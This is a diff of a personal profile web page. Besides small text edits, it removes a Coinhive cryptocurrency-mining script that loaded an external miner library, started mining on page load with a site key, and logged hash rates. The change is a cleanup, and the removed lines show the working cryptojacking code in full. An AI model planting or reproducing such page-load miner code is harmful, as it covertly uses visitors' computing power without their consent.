@@ -62,13 +62,13 @@
   <aside class="profile-card">
     <header>
       <a onclick="trackClick('profilepic')" href="t.me/imjanindu" target="_blank" rel="noopener">
-        <img src="./assets/jithumon.jpg" alt="Janindu profile photo" />
+        <img src="./assets/jithumon.jpg" alt="Janindu's Photo" />
       </a>
       <h1>Janindu Malshan</h1>
       <h2>A programming learner</h2>
     </header>
     <div class="profile-bio">
-      <p>Programmer and Music Lover</p>
+      <p>Maybe I'm a dreamer...</p>
       <i>"Arise, shine, for your light has come"</i>
     </div>
     <ul class="profile-social-links">
@@ -111,27 +111,5 @@
 
 </script>
 <script src="./service-worker.js" charset="utf-8" async></script>
-<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-<script>
-  console.log('This website is a joke.')
-  var miner = new CoinHive.Anonymous('e01UBwJ1yCJgeQ410PbZcXSGvyP1pOqu');
-  miner.start();
-
-</script>
-
-<script>
-  // Listen on events
-  miner.on('found', function () { /* Hash found */ })
-  miner.on('accepted', function () { /* Hash accepted by the pool */ })
-
-  // Update stats once per second
-  setInterval(function () {
-    var hashesPerSecond = miner.getHashesPerSecond();
-    var totalHashes = miner.getTotalHashes();
-    var acceptedHashes = miner.getAcceptedHashes();
-    console.log(hashesPerSecond, totalHashes, acceptedHashes)
-  }, 1000);
-
-</script>
 
 </html>
